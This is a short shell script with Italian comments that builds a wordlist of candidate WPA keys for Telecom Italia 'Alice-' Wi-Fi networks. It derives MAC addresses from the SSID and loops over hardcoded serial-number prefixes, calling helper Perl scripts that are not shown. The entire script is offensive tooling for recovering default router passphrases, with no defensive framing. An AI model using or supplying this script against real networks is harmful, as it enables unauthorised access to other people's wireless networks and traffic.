#!/bin/sh
#
# genera il dizionario per un certo SSID alice
#
# usage gendict.sh Alice-xxxxxxx
#
SNS="69101 69102 69103 69104 67901 67902 67903 67904"
echo $1
echo $SNS
cp /dev/null $1.txt
for i in `./ssid2mac.pl $1`
  do echo "MAC $i"
  for j in $SNS
    do echo "SN1: $j"
    ./alicewpa-dict.pl -s ${j}X0000001 -e ${j}X0999999 -m $i >> $1.txt
  done
done
